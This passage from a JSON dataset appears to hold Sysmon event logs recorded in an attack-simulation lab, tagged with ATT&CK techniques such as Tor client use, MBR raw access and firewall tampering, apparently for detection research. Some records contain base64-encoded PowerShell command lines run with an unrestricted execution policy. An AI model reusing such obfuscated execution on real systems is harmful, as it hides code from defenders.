      "parsed": {
        "SourceName": "Microsoft-Windows-Sysmon",
        "EventCode": "7",
        "Timestamp": "2021-07-09T14:59:36.243803600Z",
        "LogName": "Microsoft-Windows-Sysmon/Operational",
        "ComputerName": "win-dc-58.attackrange.local",
        "System": {
          "Provider": {
            "Name": "Microsoft-Windows-Sysmon",
            "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
          },
          "EventID": "7",
          "Version": "3",
          "Level": "4",
          "Task": "7",
          "Opcode": "0",
          "Keywords": "0x8000000000000000",
          "TimeCreated": {
            "SystemTime": "2021-07-09T14:59:36.243803600Z"
          },
          "EventRecordID": "24355",
          "Correlation": "",
          "Execution": {
            "ProcessID": "1224",
            "ThreadID": "3140"
          },
          "Channel": "Microsoft-Windows-Sysmon/Operational",
          "Computer": "win-dc-58.attackrange.local",
          "Security": {
            "UserID": "S-1-5-18"
          }
        },
        "EventData": {
          "RuleName": "-",
          "UtcTime": "2021-07-09 14:59:36.238",
          "ProcessGuid": "{C2350C16-6458-60E8-B303-00000000CF01}",
          "ProcessId": "7088",
          "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\mscorsvw.exe",
          "ImageLoaded": "C:\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\Microsoft.RightsManagementServices.ServerManager.DeploymentPlugin\\v4.0_10.0.0.0__31bf3856ad364e35\\Microsoft.RightsManagementServices.ServerManager.DeploymentPlugin.dll",
          "FileVersion": "10.0.14393.4046",
          "Description": "Microsoft.RightsManagementServices.ServerManager.DeploymentPlugin",
          "Product": "Microsoft (R) Windows (R) Operating System",
          "Company": "Microsoft Corporation",
          "OriginalFileName": "Microsoft.RightsManagementServices.ServerManager.DeploymentPlugin.dll",
          "Hashes": "MD5=03433F05AFDFAE029841C214027DE71C,SHA256=B33349C9F488C06CF572CDA7713FC3FBF69DD063E19A1411BC4C1C77F56B4273,IMPHASH=DAE02F32A21E03CE65412F6E56942DAA",
          "Signed": "true",
          "Signature": "Microsoft Windows",
          "SignatureStatus": "Valid"
        }
      }
    },
    "8": {
      "event_id": "8",
      "length": 1365,
      "source_file": "datasets\\attack_techniques\\T1090.003\\windows_tor_client_execution\\windows-sysmon.log",
      "event_index_in_file": 1,
      "raw": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>8</EventID><Version>2</Version><Level>4</Level><Task>8</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-01-20T02:23:15.6184779Z'/><EventRecordID>855</EventRecordID><Correlation/><Execution ProcessID='9452' ThreadID='3804'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DESKTOP-39DIRD1</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-01-20 02:23:15.615</Data><Data Name='SourceProcessGuid'>{09d8803c-e02c-696e-0600-000000000f00}</Data><Data Name='SourceProcessId'>632</Data><Data Name='SourceImage'>&lt;unknown process&gt;</Data><Data Name='TargetProcessGuid'>{09d8803c-e53e-696e-b504-000000000f00}</Data><Data Name='TargetProcessId'>5248</Data><Data Name='TargetImage'>C:\\Program Files\\SplunkUniversalForwarder\\bin\\splunk-winevtlog.exe</Data><Data Name='NewThreadId'>1880</Data><Data Name='StartAddress'>0x00007FFE298FD520</Data><Data Name='StartModule'>C:\\WINDOWS\\System32\\KERNELBASE.dll</Data><Data Name='StartFunction'>CtrlRoutine</Data><Data Name='SourceUser'>NT AUTHORITY\\SYSTEM</Data><Data Name='TargetUser'>NT AUTHORITY\\SYSTEM</Data></EventData></Event>",
      "parsed": {
        "SourceName": "Microsoft-Windows-Sysmon",
        "EventCode": "8",
        "Timestamp": "2026-01-20T02:23:15.6184779Z",
        "LogName": "Microsoft-Windows-Sysmon/Operational",
        "ComputerName": "DESKTOP-39DIRD1",
        "System": {
          "Provider": {
            "Name": "Microsoft-Windows-Sysmon",
            "Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
          },
          "EventID": "8",
          "Version": "2",
          "Level": "4",
          "Task": "8",
          "Opcode": "0",
          "Keywords": "0x8000000000000000",
          "TimeCreated": {
            "SystemTime": "2026-01-20T02:23:15.6184779Z"
          },
          "EventRecordID": "855",
          "Correlation": "",
          "Execution": {
            "ProcessID": "9452",
            "ThreadID": "3804"
          },
          "Channel": "Microsoft-Windows-Sysmon/Operational",
          "Computer": "DESKTOP-39DIRD1",
          "Security": {
            "UserID": "S-1-5-18"
          }
        },
        "EventData": {
          "RuleName": "-",
          "UtcTime": "2026-01-20 02:23:15.615",
          "SourceProcessGuid": "{09d8803c-e02c-696e-0600-000000000f00}",
          "SourceProcessId": "632",
          "SourceImage": "<unknown process>",
          "TargetProcessGuid": "{09d8803c-e53e-696e-b504-000000000f00}",
          "TargetProcessId": "5248",
          "TargetImage": "C:\\Program Files\\SplunkUniversalForwarder\\bin\\splunk-winevtlog.exe",
          "NewThreadId": "1880",
          "StartAddress": "0x00007FFE298FD520",
          "StartModule": "C:\\WINDOWS\\System32\\KERNELBASE.dll",
          "StartFunction": "CtrlRoutine",
          "SourceUser": "NT AUTHORITY\\SYSTEM",
          "TargetUser": "NT AUTHORITY\\SYSTEM"
        }
      }
    },
    "9": {
      "event_id": "9",
      "length": 935,
      "source_file": "datasets\\attack_techniques\\T1561.002\\mbr_raw_access\\sysmon.log",
      "event_index_in_file": 1491,
      "raw": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>9</EventID><Version>2</Version><Level>4</Level><Task>9</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2022-02-15T11:58:13.801394500Z'/><EventRecordID>182309</EventRecordID><Correlation/><Execution ProcessID='2944' ThreadID='2012'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-tcontreras-attack-range-213.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2022-02-15 11:58:13.789</Data><Data Name='ProcessGuid'>{BD6F876E-5D62-620B-1200-000000003702}</Data><Data Name='ProcessId'>396</Data><Data Name='Image'>C:\\Windows\\System32\\svchost.exe</Data><Data Name='Device'>\\Device\\HarddiskVolume1</Data></EventData></Event>",
      "parsed": {
        "SourceName": "Microsoft-Windows-Sysmon",
        "EventCode": "9",
        "Timestamp": "2022-02-15T11:58:13.801394500Z",
        "LogName": "Microsoft-Windows-Sysmon/Operational",
        "ComputerName": "win-dc-tcontreras-attack-range-213.attackrange.local",
        "System": {
          "Provider": {
            "Name": "Microsoft-Windows-Sysmon",
            "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
          },
          "EventID": "9",
          "Version": "2",
          "Level": "4",
          "Task": "9",
          "Opcode": "0",
          "Keywords": "0x8000000000000000",
          "TimeCreated": {
            "SystemTime": "2022-02-15T11:58:13.801394500Z"
          },
          "EventRecordID": "182309",
          "Correlation": "",
          "Execution": {
            "ProcessID": "2944",
            "ThreadID": "2012"
          },
          "Channel": "Microsoft-Windows-Sysmon/Operational",
          "Computer": "win-dc-tcontreras-attack-range-213.attackrange.local",
          "Security": {
            "UserID": "S-1-5-18"
          }
        },
        "EventData": {
          "RuleName": "-",
          "UtcTime": "2022-02-15 11:58:13.789",
          "ProcessGuid": "{BD6F876E-5D62-620B-1200-000000003702}",
          "ProcessId": "396",
          "Image": "C:\\Windows\\System32\\svchost.exe",
          "Device": "\\Device\\HarddiskVolume1"
        }
      }
    },
    "10": {
      "event_id": "10",
      "length": 7485,
      "source_file": "datasets\\attack_techniques\\T1562.004\\atomic_red_team\\windows-sysmon.log",
      "event_index_in_file": 9999,
      "raw": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-11-23T11:03:58.522467700Z'/><EventRecordID>18597</EventRecordID><Correlation/><Execution ProcessID='2148' ThreadID='3628'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-638.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2020-11-23 11:03:58.520</Data><Data Name='ProcessGuid'>{7E748F86-971E-5FBB-0000-0010E7492D00}</Data><Data Name='ProcessId'>6040</Data><Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='FileVersion'>10.0.14393.206 (rs1_release.160915-0644)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>PowerShell  -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand UABvAHcAZQByAFMAaABlAGwAbAAgAC0ATgBvAFAAcgBvAGYAaQBsAGUAIAAtAE4AbwBuAEkAbgB0AGUAcgBhAGMAdABpAHYAZQAgAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABVAG4AcgBlAHMAdAByAGkAYwB0AGUAZAAgAC0ARQBuAGMAbwBkAGUAZABDAG8AbQBtAGEAbgBkACAASgBnAEIAagBBAEcAZwBBAFkAdwBCAHcAQQBDADQAQQBZAHcAQgB2AEEARwAwAEEASQBBAEEAMgBBAEQAVQBBAE0AQQBBAHcAQQBEAEUAQQBJAEEAQQArAEEAQwBBAEEASgBBAEIAdQBBAEgAVQBBAGIAQQBCAHMAQQBBAG8AQQBKAEEAQgBsAEEASABnAEEAWgBRAEIAagBBAEYAOABBAGQAdwBCAHkAQQBHAEUAQQBjAEEAQgB3AEEARwBVAEEAYwBnAEIAZgBBAEgATQBBAGQAQQBCAHkAQQBDAEEAQQBQAFEAQQBnAEEAQwBRAEEAYQBRAEIAdQBBAEgAQQBBAGQAUQBCADAAQQBDAEEAQQBmAEEAQQBnAEEARQA4AEEAZABRAEIAMABBAEMAMABBAFUAdwBCADAAQQBIAEkAQQBhAFEAQgB1AEEARwBjAEEAQwBnAEEAawBBAEgATQBBAGMAQQBCAHMAQQBHAGsAQQBkAEEAQgBmAEEASABBAEEAWQBRAEIAeQBBAEgAUQBBAGMAdwBBAGcAQQBEADAAQQBJAEEAQQBrAEEARwBVAEEAZQBBAEIAbABBAEcATQBBAFgAdwBCADMAQQBIAEkAQQBZAFEAQgB3AEEASABBAEEAWgBRAEIAeQBBAEYAOABBAGMAdwBCADAAQQBIAEkAQQBMAGcAQgBUAEEASABBAEEAYgBBAEIAcABBAEgAUQBBAEsAQQBCAEEAQQBDAGcAQQBJAGcAQgBnAEEARABBAEEAWQBBAEEAdwBBAEcAQQBBAE0AQQBCAGcAQQBEAEEAQQBJAGcAQQBwAEEAQwB3AEEASQBBAEEAeQBBAEMAdwBBAEkAQQBCAGIAQQBGAE0AQQBkAEEAQgB5AEEARwBrAEEAYgBnAEIAbgBBAEYATQBBAGMAQQBCAHMAQQBHAGsAQQBkAEEAQgBQAEEASABBAEEAZABBAEIAcABBAEcAOABBAGIAZwBCAHoAQQBGADAAQQBPAGcAQQA2AEEARgBJAEEAWgBRAEIAdABBAEcAOABBAGQAZwBCAGwAQQBFAFUAQQBiAFEAQgB3AEEASABRAEEAZQBRAEIARgBBAEcANABBAGQAQQBCAHkAQQBHAGsAQQBaAFEAQgB6AEEAQwBrAEEAQwBnAEIASgBBAEcAWQBBAEkAQQBBAG8AQQBDADAAQQBiAGcAQgB2AEEASABRAEEASQBBAEEAawBBAEgATQBBAGMAQQBCAHMAQQBHAGsAQQBkAEEAQgBmAEEASABBAEEAWQBRAEIAeQBBAEgAUQBBAGMAdwBBAHUAQQBFAHcAQQBaAFEAQgB1AEEARwBjAEEAZABBAEIAbwBBAEMAQQBBAEwAUQBCAGwAQQBIAEUAQQBJAEEAQQB5AEEAQwBrAEEASQBBAEIANwBBAEMAQQBBAGQAQQBCAG8AQQBIAEkAQQBiAHcAQgAzAEEAQwBBAEEASQBnAEIAcABBAEcANABBAGQAZwBCAGgAQQBHAHcAQQBhAFEAQgBrAEEAQwBBAEEAYwBBAEIAaABBAEgAawBBAGIAQQBCAHYAQQBHAEUAQQBaAEEAQQBpAEEAQwBBAEEAZgBRAEEASwBBAEYATQBBAFoAUQBCADAAQQBDADAAQQBWAGcAQgBoAEEASABJAEEAYQBRAEIAaABBAEcASQBBAGIAQQBCAGwAQQBDAEEAQQBMAFEAQgBPAEEARwBFAEEAYgBRAEIAbABBAEMAQQBBAGEAZwBCAHoAQQBHADgAQQBiAGcAQgBmAEEASABJAEEAWQBRAEIAMwBBAEMAQQBBAEwAUQBCAFcAQQBHAEUAQQBiAEEAQgAxAEEARwBVAEEASQBBAEEAawBBAEgATQBBAGMAQQBCAHMAQQBHAGsAQQBkAEEAQgBmAEEASABBAEEAWQBRAEIAeQBBAEgAUQBBAGMAdwBCAGIAQQBEAEUAQQBYAFEAQQBLAEEAQwBRAEEAWgBRAEIANABBAEcAVQBBAFkAdwBCAGYAQQBIAGMAQQBjAGcAQgBoAEEASABBAEEAYwBBAEIAbABBAEgASQBBAEkAQQBBADkAQQBDAEEAQQBXAHcAQgBUAEEARwBNAEEAYwBnAEIAcABBAEgAQQBBAGQAQQBCAEMAQQBHAHcAQQBiAHcAQgBqAEEARwBzAEEAWABRAEEANgBBAEQAbwBBAFEAdwBCAHkAQQBHAFUAQQBZAFEAQgAwAEEARwBVAEEASwBBAEEAawBBAEgATQBBAGMAQQBCAHMAQQBHAGsAQQBkAEEAQgBmAEEASABBAEEAWQBRAEIAeQBBAEgAUQBBAGMAdwBCAGIAQQBEAEEAQQBYAFEAQQBwAEEAQQBvAEEASgBnAEEAawBBAEcAVQBBAGUAQQBCAGwAQQBHAE0AQQBYAHcAQgAzAEEASABJAEEAWQBRAEIAdwBBAEgAQQBBAFoAUQBCAHkAQQBBAD0APQA=</Data><Data Name='CurrentDirectory'>C:\\Users\\Administrator\\</Data><Data Name='User'>ATTACKRANGE\\Administrator</Data><Data Name='LogonGuid'>{7E748F86-971E-5FBB-0000-002045462D00}</Data><Data Name='LogonId'>0x2d4645</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data><Data Name='ParentProcessGuid'>{7E748F86-971E-5FBB-0000-001041492D00}</Data><Data Name='ParentProcessId'>7088</Data><Data Name='ParentImage'>C:\\Windows\\System32\\cmd.exe</Data><Data Name='ParentCommandLine'>C:\\Windows\\system32\\cmd.exe /C PowerShell -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand UABvAHcAZQByAFMAaABlAGwAbAAgAC0ATgBvAFAAcgBvAGYAaQBsAGUAIAAtAE4AbwBuAEkAbgB0AGUAcgBhAGMAdABpAHYAZQAgAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABVAG4AcgBlAHMAdAByAGkAYwB0AGUAZAAgAC0ARQBuAGMAbwBkAGUAZABDAG8AbQBtAGEAbgBkACAASgBnAEIAagBBAEcAZwBBAFkAdwBCAHcAQQBDADQAQQBZAHcAQgB2AEEARwAwAEEASQBBAEEAMgBBAEQAVQBBAE0AQQBBAHcAQQBEAEUAQQBJAEEAQQArAEEAQwBBAEEASgBBAEIAdQBBAEgAVQBBAGIAQQBCAHMAQQBBAG8AQQBKAEEAQgBsAEEASABnAEEAWgBRAEIAagBBAEYAOABBAGQAdwBCAHkAQQBHAEUAQQBjAEEAQgB3AEEARwBVAEEAYwBnAEIAZgBBAEgATQBBAGQAQQBCAHkAQQBDAEEAQQBQAFEAQQBnAEEAQwBRAEEAYQBRAEIAdQBBAEgAQQBBAGQAUQBCADAAQQBDAEEAQQBmAEEAQQBnAEEARQA4AEEAZABRAEIAMABBAEMAMABBAFUAdwBCADAAQQBIAEkAQQBhAFEAQgB1AEEARwBjAEEAQwBnAEEAawBBAEgATQBBAGMAQQBCAHMAQQBHAGsAQQBkAEEAQgBmAEEASABBAEEAWQBRAEIAeQBBAEgAUQBBAGMAdwBBAGcAQQBEADAAQQBJAEEAQQBrAEEARwBVAEEAZQBBAEIAbABBAEcATQBBAFgAdwBCADMAQQBIAEkAQQBZAFEAQgB3AEEASABBAEEAWgBRAEIAeQBBAEYAOABBAGMAdwBCADAAQQBIAEkAQQBMAGcAQgBUAEEASABBAEEAYgBBAEIAcABBAEgAUQBBAEsAQQBCAEEAQQBDAGcAQQBJAGcAQgBnAEEARABBAEEAWQBBAEEAdwBBAEcAQQBBAE0AQQBCAGcAQQBEAEEAQQBJAGcAQQBwAEEAQwB3AEEASQBBAEEAeQBBAEMAdwBBAEkAQQBCAGIAQQBGAE0AQQBkAEEAQgB5AEEARwBrAEEAYgBnAEIAbgBBAEYATQBBAGMAQQBCAHMAQQBHAGsAQQBkAEEAQgBQAEEASABBAEEAZABBAEIAcABBAEcAOABBAGIAZwBCAHoAQQBGADAAQQBPAGcAQQA2AEEARgBJAEEAWgBRAEIAdABBAEcAOABBAGQAZwBCAGwAQQBFAFUAQQBiAFEAQgB3AEEASABRAEEAZQBRAEIARgBBAEcANABBAGQAQQBCAHkAQQBHAGsAQQBaAFEAQgB6AEEAQwBrAEEAQwBnAEIASgBBAEcAWQBBAEkAQQBBAG8AQQBDADAAQQBiAGcAQgB2AEEASABRAEEASQBBAEEAawBBAEgATQBBAGMAQQBCAHMAQQBHAGsAQQBkAEEAQgBmAEEASABBAEEAWQBRAEIAeQBBAEgAUQBBAGMAdwBBAHUAQQBFAHcAQQBaAFEAQgB1AEEARwBjAEEAZABBAEIAbwBBAEMAQQBBAEwAUQBCAGwAQQBIAEUAQQBJAEEAQQB5AEEAQwBrAEEASQBBAEIANwBBAEMAQQBBAGQAQQBCAG8AQQBIAEkAQQBiAHcAQgAzAEEAQwBBAEEASQBnAEIAcABBAEcANABBAGQAZwBCAGgAQQBHAHcAQQBhAFEAQgBrAEEAQwBBAEEAYwBBAEIAaABBAEgAawBBAGIAQQBCAHYAQQBHAEUAQQBaAEEAQQBpAEEAQwBBAEEAZgBRAEEASwBBAEYATQBBAFoAUQBCADAAQQBDADAAQQBWAGcAQgBoAEEASABJAEEAYQBRAEIAaABBAEcASQBBAGIAQQBCAGwAQQBDAEEAQQBMAFEAQgBPAEEARwBFAEEAYgBRAEIAbABBAEMAQQBBAGEAZwBCAHoAQQBHADgAQQBiAGcAQgBmAEEASABJAEEAWQBRAEIAMwBBAEMAQQBBAEwAUQBCAFcAQQBHAEUAQQBiAEEAQgAxAEEARwBVAEEASQBBAEEAawBBAEgATQBBAGMAQQBCAHMAQQBHAGsAQQBkAEEAQgBmAEEASABBAEEAWQBRAEIAeQBBAEgAUQBBAGMAdwBCAGIAQQBEAEUAQQBYAFEAQQBLAEEAQwBRAEEAWgBRAEIANABBAEcAVQBBAFkAdwBCAGYAQQBIAGMAQQBjAGcAQgBoAEEASABBAEEAYwBBAEIAbABBAEgASQBBAEkAQQBBADkAQQBDAEEAQQBXAHcAQgBUAEEARwBNAEEAYwBnAEIAcABBAEgAQQBBAGQAQQBCAEMAQQBHAHcAQQBiAHcAQgBqAEEARwBzAEEAWABRAEEANgBBAEQAbwBBAFEAdwBCAHkAQQBHAFUAQQBZAFEAQgAwAEEARwBVAEEASwBBAEEAawBBAEgATQBBAGMAQQBCAHMAQQBHAGsAQQBkAEEAQgBmAEEASABBAEEAWQBRAEIAeQBBAEgAUQBBAGMAdwBCAGIAQQBEAEEAQQBYAFEAQQBwAEEAQQBvAEEASgBnAEEAawBBAEcAVQBBAGUAQQBCAGwAQQBHAE0AQQBYAHcAQgAzAEEASABJAEEAWQBRAEIAdwBBAEgAQQBBAFoAUQBCAHkAQQBBAD0APQA=</Data></EventData></Event>",
      "parsed": {
        "SourceName": "Microsoft-Windows-Sysmon",
        "EventCode": "10",
        "Timestamp": "2020-11-23T11:03:58.549807600Z",
        "LogName": "Microsoft-Windows-Sysmon/Operational",
        "ComputerName": "win-dc-638.attackrange.local",
        "System": {
          "Provider": {
            "Name": "Microsoft-Windows-Sysmon",
            "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
          },
          "EventID": "10",
          "Version": "3",
          "Level": "4",
          "Task": "10",
          "Opcode": "0",
          "Keywords": "0x8000000000000000",
          "TimeCreated": {
            "SystemTime": "2020-11-23T11:03:58.549807600Z"
          },
          "EventRecordID": "18605",
          "Correlation": "",
          "Execution": {
            "ProcessID": "2148",
            "ThreadID": "3628"
          },
          "Channel": "Microsoft-Windows-Sysmon/Operational",
          "Computer": "win-dc-638.attackrange.local",
          "Security": {
            "UserID": "S-1-5-18"
          }
        },
        "EventData": {
          "RuleName": "",
          "UtcTime": "2020-11-23 11:03:58.537",
          "SourceProcessGUID": "{7E748F86-8C6D-5FBB-0000-0010DD650000}",
          "SourceProcessId": "592",
          "SourceThreadId": "3020",
          "SourceImage": "C:\\Windows\\system32\\svchost.exe",
          "TargetProcessGUID": "{7E748F86-971E-5FBB-0000-0010E7492D00}",
          "TargetProcessId": "6040",
          "TargetImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          "GrantedAccess": "0x1000",
          "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+a5a94|C:\\Windows\\System32\\KERNELBASE.dll+221bd|c:\\windows\\system32\\rpcss.dll+5296|C:\\Windows\\System32\\RPCRT4.dll+78693|C:\\Windows\\System32\\RPCRT4.dll+2d5ab|C:\\Windows\\System32\\RPCRT4.dll+61b6a|C:\\Windows\\System32\\RPCRT4.dll+52964|C:\\Windows\\System32\\RPCRT4.dll+5187d|C:\\Windows\\System32\\RPCRT4.dll+5212b|C:\\Windows\\System32\\RPCRT4.dll+2469c|C:\\Windows\\System32\\RPCRT4.dll+24b1c|C:\\Windows\\System32\\RPCRT4.dll+111bc|C:\\Windows\\System32\\RPCRT4.dll+12a1b|C:\\Windows\\System32\\RPCRT4.dll+1e12a|C:\\Windows\\SYSTEM32\\ntdll.dll+1d34e|C:\\Windows\\SYSTEM32\\ntdll.dll+1ecb9|C:\\Windows\\System32\\KERNEL32.DLL+84d4|C:\\Windows\\SYSTEM32\\ntdll.dll+51791"
        }
      }
    },
    "11": {
      "event_id": "11",
      "length": 7485,
      "source_file": "datasets\\attack_techniques\\T1562.004\\atomic_red_team\\windows-sysmon.log",
      "event_index_in_file": 10325,
      "raw": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-11-23T11:03:51.302691700Z'/><EventRecordID>18270</EventRecordID><Correlation/><Execution ProcessID='2148' ThreadID='3628'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-638.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2020-11-23 11:03:51.301</Data><Data Name='ProcessGuid'>{7E748F86-9717-5FBB-0000-0010AF7B2C00}</Data><Data Name='ProcessId'>6920</Data><Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='FileVersion'>10.0.14393.206 (rs1_release.160915-0644)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>PowerShell  -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand UABvAHcAZQByAFMAaABlAGwAbAAgAC0ATgBvAFAAcgBvAGYAaQBsAGUAIAAtAE4AbwBuAEkAbgB0AGUAcgBhAGMAdABpAHYAZQAgAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABVAG4AcgBlAHMAdAByAGkAYwB0AGUAZAAgAC0ARQBuAGMAbwBkAGUAZABDAG8AbQBtAGEAbgBkACAASgBnAEIAagBBAEcAZwBBAFkAdwBCAHcAQQBDADQAQQBZAHcAQgB2AEEARwAwAEEASQBBAEEAMgBBAEQAVQBBAE0AQQBBAHcAQQBEAEUAQQBJAEEAQQArAEEAQwBBAEEASgBBAEIAdQBBAEgAVQBBAGIAQQBCAHMAQQBBAG8AQQBKAEEAQgBsAEEASABnAEEAWgBRAEIAagBBAEYAOABBAGQAdwBCAHkAQQBHAEUAQQBjAEEAQgB3AEEARwBVAEEAYwBnAEIAZgBBAEgATQBBAGQAQQBCAHkAQQBDAEEAQQBQAFEAQQBnAEEAQwBRAEEAYQBRAEIAdQBBAEgAQQBBAGQAUQBCADAAQQBDAEEAQQBmAEEAQQBnAEEARQA4AEEAZABRAEIAMABBAEMAMABBAFUAdwBCADAAQQBIAEkAQQBhAFEAQgB1AEEARwBjAEEAQwBnAEEAawBBAEgATQBBAGMAQQBCAHMAQQBHAGsAQQBkAEEAQgBmAEEASABBAEEAWQBRAEIAeQBBAEgAUQBBAGMAdwBBAGcAQQBEADAAQQBJAEEAQQBrAEEARwBVAEEAZQBBAEIAbABBAEcATQBBAFgAdwBCADMAQQBIAEkAQQBZAFEAQgB3AEEASABBAEEAWgBRAEIAeQBBAEYAOABBAGMAdwBCADAAQQBIAEkAQQBMAGcAQgBUAEEASABBAEEAYgBBAEIAcABBAEgAUQBBAEsAQQBCAEEAQQBDAGcAQQBJAGcAQgBnAEEARABBAEEAWQBBAEEAdwBBAEcAQQBBAE0AQQBCAGcAQQBEAEEAQQBJAGcAQQBwAEEAQwB3AEEASQBBAEEAeQBBAEMAdwBBAEkAQQBCAGIAQQBGAE0AQQBkAEEAQgB5AEEARwBrAEEAYgBnAEIAbgBBAEYATQBBAGMAQQBCAHMAQQBHAGsAQQBkAEEAQgBQAEEASABBAEEAZABBAEIAcABBAEcAOABBAGIAZwBCAHoAQQBGADAAQQBPAGcAQQA2AEEARgBJAEEAWgBRAEIAdABBAEcAOABBAGQAZwBCAGwAQQBFAFUAQQBiAFEAQgB3AEEASABRAEEAZQBRAEIARgBBAEcANABBAGQAQQBCAHkAQQBHAGsAQQBaAFEAQgB6AEEAQwBrAEEAQwBnAEIASgBBAEcAWQBBAEkAQQBBAG8AQQBDADAAQQBiAGcAQgB2AEEASABRAEEASQBBAEEAawBBAEgATQBBAGMAQQBCAHMAQQBHAGsAQQBkAEEAQgBmAEEASABBAEEAWQBRAEIAeQBBAEgAUQBBAGMAdwBBAHUAQQBFAHcAQQBaAFEAQgB1AEEARwBjAEEAZABBAEIAbwBBAEMAQQBBAEwAUQBCAGwAQQBIAEUAQQBJAEEAQQB5AEEAQwBrAEEASQBBAEIANwBBAEMAQQBBAGQAQQBCAG8AQQBIAEkAQQBiAHcAQgAzAEEAQwBBAEEASQBnAEIAcABBAEcANABBAGQAZwBCAGgAQQBHAHcAQQBhAFEAQgBrAEEAQwBBAEEAYwBBAEIAaABBAEgAawBBAGIAQQBCAHYAQQBHAEUAQQBaAEEAQQBpAEEAQwBBAEEAZgBRAEEASwBBAEYATQBBAFoAUQBCADAAQQBDADAAQQBWAGcAQgBoAEEASABJAEEAYQBRAEIAaABBAEcASQBBAGIAQQBCAGwAQQBDAEEAQQBMAFEAQgBPAEEARwBFAEEAYgBRAEIAbABBAEMAQQBBAGEAZwBCAHoAQQBHADgAQQBiAGcAQgBmAEEASABJAEEAWQBRAEIAMwBBAEMAQQBBAEwAUQBCAFcAQQBHAEUAQQBiAEEAQgAxAEEARwBVAEEASQBBAEEAawBBAEgATQBBAGMAQQBCAHMAQQBHAGsAQQBkAEEAQgBmAEEASABBAEEAWQBRAEIAeQBBAEgAUQBBAGMAdwBCAGIAQQBEAEUAQQBYAFEAQQBLAEEAQwBRAEEAWgBRAEIANABBAEcAVQBBAFkAdwBCAGYAQQBIAGMAQQBjAGcAQgBoAEEASABBAEEAYwBBAEIAbABBAEgASQBBAEkAQQBBADkAQQBDAEEAQQBXAHcAQgBUAEEARwBNAEEAYwBnAEIAcABBAEgAQQBBAGQAQQBCAEMAQQBHAHcAQQBiAHcAQgBqAEEARwBzAEEAWABRAEEANgBBAEQAbwBBAFEAdwBCAHkAQQBHAFUAQQBZAFEAQgAwAEEARwBVAEEASwBBAEEAawBBAEgATQBBAGMAQQBCAHMAQQBHAGsAQQBkAEEAQgBmAEEASABBAEEAWQBRAEIAeQBBAEgAUQBBAGMAdwBCAGIAQQBEAEEAQQBYAFEAQQBwAEEAQQBvAEEASgBnAEEAawBBAEcAVQBBAGUAQQBCAGwAQQBHAE0AQQBYAHcAQgAzAEEASABJAEEAWQBRAEIAdwBBAEgAQQBBAFoAUQBCAHkAQQBBAD0APQA=</Data><Data Name='CurrentDirectory'>C:\\Users\\Administrator\\</Data><Data Name='User'>ATTACKRANGE\\Administrator</Data><Data Name='LogonGuid'>{7E748F86-9717-5FBB-0000-002079772C00}</Data><Data Name='LogonId'>0x2c7779</Data><Data 